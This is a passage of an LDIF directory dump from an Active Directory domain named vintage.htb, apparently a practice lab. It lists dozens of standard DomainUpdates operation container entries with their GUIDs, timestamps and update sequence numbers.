 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5765
uSNChanged: 5765
showInAdvancedViewOnly: TRUE
name: c4f17608-e611-11d6-9793-00c04f613221
objectGUID:: ZD1U4c7CTUaQVjQ2I2kDNw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 13d15cf0-e6c8-11d6-9793-00c04f613221, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=13d15cf0-e6c8-11d6-9793-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 13d15cf0-e6c8-11d6-9793-00c04f613221
distinguishedName: CN=13d15cf0-e6c8-11d6-9793-00c04f613221,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5766
uSNChanged: 5766
showInAdvancedViewOnly: TRUE
name: 13d15cf0-e6c8-11d6-9793-00c04f613221
objectGUID:: bOsrIyn0gEa0l0sdH/KJpA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
distinguishedName: CN=8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5767
uSNChanged: 5767
showInAdvancedViewOnly: TRUE
name: 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
objectGUID:: AAKz5oDfdkexSdzHyGrFhA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# dda1d01d-4bd7-4c49-a184-46f9241b560e, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=dda1d01d-4bd7-4c49-a184-46f9241b560e,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: dda1d01d-4bd7-4c49-a184-46f9241b560e
distinguishedName: CN=dda1d01d-4bd7-4c49-a184-46f9241b560e,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5768
uSNChanged: 5768
showInAdvancedViewOnly: TRUE
name: dda1d01d-4bd7-4c49-a184-46f9241b560e
objectGUID:: V91gnD1IykOgF/IAC10iPQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# a1789bfb-e0a2-4739-8cc0-e77d892d080a, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=a1789bfb-e0a2-4739-8cc0-e77d892d080a,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: a1789bfb-e0a2-4739-8cc0-e77d892d080a
distinguishedName: CN=a1789bfb-e0a2-4739-8cc0-e77d892d080a,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5769
uSNChanged: 5769
showInAdvancedViewOnly: TRUE
name: a1789bfb-e0a2-4739-8cc0-e77d892d080a
objectGUID:: 6cj5NqWuJ0K4ZF1xkjXBHw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 61b34cb0-55ee-4be9-b595-97810b92b017, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=61b34cb0-55ee-4be9-b595-97810b92b017,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 61b34cb0-55ee-4be9-b595-97810b92b017
distinguishedName: CN=61b34cb0-55ee-4be9-b595-97810b92b017,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5770
uSNChanged: 5770
showInAdvancedViewOnly: TRUE
name: 61b34cb0-55ee-4be9-b595-97810b92b017
objectGUID:: QTZgHgGiEU+IByW/v6NGfg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 57428d75-bef7-43e1-938b-2e749f5a8d56, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=57428d75-bef7-43e1-938b-2e749f5a8d56,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 57428d75-bef7-43e1-938b-2e749f5a8d56
distinguishedName: CN=57428d75-bef7-43e1-938b-2e749f5a8d56,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5771
uSNChanged: 5771
showInAdvancedViewOnly: TRUE
name: 57428d75-bef7-43e1-938b-2e749f5a8d56
objectGUID:: SpwETCl8/USHOZBTdGcYSQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# ebad865a-d649-416f-9922-456b53bbb5b8, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=ebad865a-d649-416f-9922-456b53bbb5b8,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: ebad865a-d649-416f-9922-456b53bbb5b8
distinguishedName: CN=ebad865a-d649-416f-9922-456b53bbb5b8,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5772
uSNChanged: 5772
showInAdvancedViewOnly: TRUE
name: ebad865a-d649-416f-9922-456b53bbb5b8
objectGUID:: dyoWMdMJxECoIL1fnFPbaw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 0b7fb422-3609-4587-8c2e-94b10f67d1bf, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=0b7fb422-3609-4587-8c2e-94b10f67d1bf,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 0b7fb422-3609-4587-8c2e-94b10f67d1bf
distinguishedName: CN=0b7fb422-3609-4587-8c2e-94b10f67d1bf,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5773
uSNChanged: 5773
showInAdvancedViewOnly: TRUE
name: 0b7fb422-3609-4587-8c2e-94b10f67d1bf
objectGUID:: tnioxTNOaEy2DWU1eeul8Q==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 2951353e-d102-4ea5-906c-54247eeec741, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=2951353e-d102-4ea5-906c-54247eeec741,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 2951353e-d102-4ea5-906c-54247eeec741
distinguishedName: CN=2951353e-d102-4ea5-906c-54247eeec741,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5774
uSNChanged: 5774
showInAdvancedViewOnly: TRUE
name: 2951353e-d102-4ea5-906c-54247eeec741
objectGUID:: N7GLkDHgOUiMk/tzfOBvhQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 71482d49-8870-4cb3-a438-b6fc9ec35d70, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=71482d49-8870-4cb3-a438-b6fc9ec35d70,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 71482d49-8870-4cb3-a438-b6fc9ec35d70
distinguishedName: CN=71482d49-8870-4cb3-a438-b6fc9ec35d70,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5775
uSNChanged: 5775
showInAdvancedViewOnly: TRUE
name: 71482d49-8870-4cb3-a438-b6fc9ec35d70
objectGUID:: LYyRUdA4JU25K0nE1dp29g==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# aed72870-bf16-4788-8ac7-22299c8207f1, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=aed72870-bf16-4788-8ac7-22299c8207f1,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: aed72870-bf16-4788-8ac7-22299c8207f1
distinguishedName: CN=aed72870-bf16-4788-8ac7-22299c8207f1,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5776
uSNChanged: 5776
showInAdvancedViewOnly: TRUE
name: aed72870-bf16-4788-8ac7-22299c8207f1
objectGUID:: 06/uvK9hnU2tRMk0rQG1lA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# f58300d1-b71a-4DB6-88a1-a8b9538beaca, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=f58300d1-b71a-4DB6-88a1-a8b9538beaca,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: f58300d1-b71a-4DB6-88a1-a8b9538beaca
distinguishedName: CN=f58300d1-b71a-4DB6-88a1-a8b9538beaca,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5777
uSNChanged: 5777
showInAdvancedViewOnly: TRUE
name: f58300d1-b71a-4DB6-88a1-a8b9538beaca
objectGUID:: Lzcnbyd4g0SR23PvQcebtQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 231fb90b-c92a-40c9-9379-bacfc313a3e3, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=231fb90b-c92a-40c9-9379-bacfc313a3e3,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 231fb90b-c92a-40c9-9379-bacfc313a3e3
distinguishedName: CN=231fb90b-c92a-40c9-9379-bacfc313a3e3,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5778
uSNChanged: 5778
showInAdvancedViewOnly: TRUE
name: 231fb90b-c92a-40c9-9379-bacfc313a3e3
objectGUID:: jdOsAnhKpEWlby1/cfvEnA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
distinguishedName: CN=4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5779
uSNChanged: 5779
showInAdvancedViewOnly: TRUE
name: 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
objectGUID:: 9pgKz581/E6EIRkkEF0xwQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 9738c400-7795-4d6e-b19d-c16cd6486166, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=9738c400-7795-4d6e-b19d-c16cd6486166,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 9738c400-7795-4d6e-b19d-c16cd6486166
distinguishedName: CN=9738c400-7795-4d6e-b19d-c16cd6486166,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5780
uSNChanged: 5780
showInAdvancedViewOnly: TRUE
name: 9738c400-7795-4d6e-b19d-c16cd6486166
objectGUID:: 7ddeiVfQR0iuBke2bZFjHQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# de10d491-909f-4fb0-9abb-4b7865c0fe80, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=de10d491-909f-4fb0-9abb-4b7865c0fe80,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: de10d491-909f-4fb0-9abb-4b7865c0fe80
distinguishedName: CN=de10d491-909f-4fb0-9abb-4b7865c0fe80,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5781
uSNChanged: 5781
showInAdvancedViewOnly: TRUE
name: de10d491-909f-4fb0-9abb-4b7865c0fe80
objectGUID:: AGx7YsFQJEeds5yEK+NByA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# b96ed344-545a-4172-aa0c-68118202f125, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=b96ed344-545a-4172-aa0c-68118202f125,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: b96ed344-545a-4172-aa0c-68118202f125
distinguishedName: CN=b96ed344-545a-4172-aa0c-68118202f125,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5782
uSNChanged: 5782
showInAdvancedViewOnly: TRUE
name: b96ed344-545a-4172-aa0c-68118202f125
objectGUID:: XajIlH4+FkW4G/GQ2N70Tw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 4c93ad42-178a-4275-8600-16811d28f3aa, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=4c93ad42-178a-4275-8600-16811d28f3aa,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 4c93ad42-178a-4275-8600-16811d28f3aa
distinguishedName: CN=4c93ad42-178a-4275-8600-16811d28f3aa,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5783
uSNChanged: 5783
showInAdvancedViewOnly: TRUE
name: 4c93ad42-178a-4275-8600-16811d28f3aa
objectGUID:: lFiUJte+NEOG7YOqM0NUZw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# c88227bc-fcca-4b58-8d8a-cd3d64528a02, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=c88227bc-fcca-4b58-8d8a-cd3d64528a02,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: c88227bc-fcca-4b58-8d8a-cd3d64528a02
distinguishedName: CN=c88227bc-fcca-4b58-8d8a-cd3d64528a02,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5784
uSNChanged: 5784
showInAdvancedViewOnly: TRUE
name: c88227bc-fcca-4b58-8d8a-cd3d64528a02
objectGUID:: vcv1np3/skqbGr5OpHU2bA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 5e1574f6-55df-493e-a671-aaeffca6a100, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=5e1574f6-55df-493e-a671-aaeffca6a100,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 5e1574f6-55df-493e-a671-aaeffca6a100
distinguishedName: CN=5e1574f6-55df-493e-a671-aaeffca6a100,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5785
uSNChanged: 5785
showInAdvancedViewOnly: TRUE
name: 5e1574f6-55df-493e-a671-aaeffca6a100
objectGUID:: OkxQUAmF1Em59JjEKSGPiQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# d262aae8-41f7-48ed-9f35-56bbb677573d, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=d262aae8-41f7-48ed-9f35-56bbb677573d,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: d262aae8-41f7-48ed-9f35-56bbb677573d
distinguishedName: CN=d262aae8-41f7-48ed-9f35-56bbb677573d,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5786
uSNChanged: 5786
showInAdvancedViewOnly: TRUE
name: d262aae8-41f7-48ed-9f35-56bbb677573d
objectGUID:: IZFsdePJnkyoQtp7Fm3PdA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 82112ba0-7e4c-4a44-89d9-d46c9612bf91, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=82112ba0-7e4c-4a44-89d9-d46c9612bf91,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 82112ba0-7e4c-4a44-89d9-d46c9612bf91
distinguishedName: CN=82112ba0-7e4c-4a44-89d9-d46c9612bf91,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5787
uSNChanged: 5787
showInAdvancedViewOnly: TRUE
name: 82112ba0-7e4c-4a44-89d9-d46c9612bf91
objectGUID:: 1TRXbeaFykmI4wLK6aM+5Q==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# c3c927a6-cc1d-47c0-966b-be8f9b63d991, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=c3c927a6-cc1d-47c0-966b-be8f9b63d991,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: c3c927a6-cc1d-47c0-966b-be8f9b63d991
distinguishedName: CN=c3c927a6-cc1d-47c0-966b-be8f9b63d991,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5788
uSNChanged: 5788
showInAdvancedViewOnly: TRUE
name: c3c927a6-cc1d-47c0-966b-be8f9b63d991
objectGUID:: QSK49G1oPkysxkzC0h5BrQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 54afcfb9-637a-4251-9f47-4d50e7021211, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=54afcfb9-637a-4251-9f47-4d50e7021211,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 54afcfb9-637a-4251-9f47-4d50e7021211
distinguishedName: CN=54afcfb9-637a-4251-9f47-4d50e7021211,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5789
uSNChanged: 5789
showInAdvancedViewOnly: TRUE
name: 54afcfb9-637a-4251-9f47-4d50e7021211
objectGUID:: 69gfoDVNtUSqe+GgaLuU9g==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# f4728883-84dd-483c-9897-274f2ebcf11e, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=f4728883-84dd-483c-9897-274f2ebcf11e,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: f4728883-84dd-483c-9897-274f2ebcf11e
distinguishedName: CN=f4728883-84dd-483c-9897-274f2ebcf11e,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5790
uSNChanged: 5790
showInAdvancedViewOnly: TRUE
name: f4728883-84dd-483c-9897-274f2ebcf11e
objectGUID:: xuGpBV+bVk6Sq7VPPZp3HQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
distinguishedName: CN=ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5791
uSNChanged: 5791
showInAdvancedViewOnly: TRUE
name: ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
objectGUID:: nCj2MIhDCkGnY+2fbhlMhA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 83C53DA7-427E-47A4-A07A-A324598B88F7, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=83C53DA7-427E-47A4-A07A-A324598B88F7,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 83C53DA7-427E-47A4-A07A-A324598B88F7
distinguishedName: CN=83C53DA7-427E-47A4-A07A-A324598B88F7,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5792
uSNChanged: 5792
showInAdvancedViewOnly: TRUE
name: 83C53DA7-427E-47A4-A07A-A324598B88F7
objectGUID:: cwLJ2kGBw0i8WH+TiKVxYA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# C81FC9CC-0130-4FD1-B272-634D74818133, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=C81FC9CC-0130-4FD1-B272-634D74818133,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: C81FC9CC-0130-4FD1-B272-634D74818133
distinguishedName: CN=C81FC9CC-0130-4FD1-B272-634D74818133,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5793
uSNChanged: 5793
showInAdvancedViewOnly: TRUE
name: C81FC9CC-0130-4FD1-B272-634D74818133
objectGUID:: IiAXNLNzFEeAfwcRE5H1lg==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# E5F9E791-D96D-4FC9-93C9-D53E1DC439BA, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=E5F9E791-D96D-4FC9-93C9-D53E1DC439BA,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
distinguishedName: CN=E5F9E791-D96D-4FC9-93C9-D53E1DC439BA,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5794
uSNChanged: 5794
showInAdvancedViewOnly: TRUE
name: E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
objectGUID:: WnA801jmmE2Jt7UoEfvjvQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# e6d5fd00-385d-4e65-b02d-9da3493ed850, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=e6d5fd00-385d-4e65-b02d-9da3493ed850,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: e6d5fd00-385d-4e65-b02d-9da3493ed850
distinguishedName: CN=e6d5fd00-385d-4e65-b02d-9da3493ed850,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5795
uSNChanged: 5795
showInAdvancedViewOnly: TRUE
name: e6d5fd00-385d-4e65-b02d-9da3493ed850
objectGUID:: zZ/eewemZUSGvLrYUAafvw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 3a6b3fbf-3168-4312-a10d-dd5b3393952d, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=3a6b3fbf-3168-4312-a10d-dd5b3393952d,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 3a6b3fbf-3168-4312-a10d-dd5b3393952d
distinguishedName: CN=3a6b3fbf-3168-4312-a10d-dd5b3393952d,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5796
uSNChanged: 5796
showInAdvancedViewOnly: TRUE
name: 3a6b3fbf-3168-4312-a10d-dd5b3393952d
objectGUID:: RPHIPjZOO0SKghFm3ebZ3A==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 7F950403-0AB3-47F9-9730-5D7B0269F9BD, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=7F950403-0AB3-47F9-9730-5D7B0269F9BD,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 7F950403-0AB3-47F9-9730-5D7B0269F9BD
distinguishedName: CN=7F950403-0AB3-47F9-9730-5D7B0269F9BD,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
